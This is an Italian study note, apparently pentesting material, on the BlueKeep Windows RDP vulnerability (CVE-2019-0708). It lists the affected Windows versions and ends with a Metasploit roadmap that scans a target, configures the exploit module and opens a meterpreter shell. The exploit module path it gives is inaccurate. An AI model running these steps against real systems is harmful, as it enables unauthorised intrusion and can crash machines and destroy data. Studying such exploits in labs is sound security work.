BlueKeep (CVE-2019-0708) è il  nome della **vulnerabilità Windows** **RDP** che permette di **eseguire** da remoto **codice arbitrario** e ottenere **l'accesso** a un **sistema** Windows e di conseguenza alla **rete** del
sistema di destinazione. Resa pubblica nel **2019.**

Per accedere al sistema target **sfrutta** una porzione di **memoria** del **kernel** permettendo così da eseguire da remoto codice arbitrario sul sistema **senza autenticazione.**

La vulnerabilità di BlueKeep riguarda più versioni di Windows:

- XP
- Vista
- Windows 7
- Windows Server 2008 & R2

MSF ha moduli che permettono di verificare se è presente questa vulnerabilità nei SO target e di exploitarla.

**NOTA**: **importante** sapere che **in ambienti non di laboratorio** questo exploit se utilizzato **potrebbe** **portare** a **crash** dei **sistemi** con conseguente **perdita dei dati**

### Roadmap

1. **msfconsole**
2. **search BlueKeep**
3. **use auxiliary/scanner/rdp/cve_2019_0708_bluekeep** verifica se il target è vulnerabile
    1. set rhost, port and run
4. **use exploit/scanner/rdp/cve_2019_0708_bluekeep** modulo per ****exploit bluekeep, che **funziona** solo su sistemi **x64**
    1. set rhost, rport, lhost, lport 
    2. show targets
    3. set targets TARGET_MACHINE
    4. run
5. shell meterpreter ottenuta
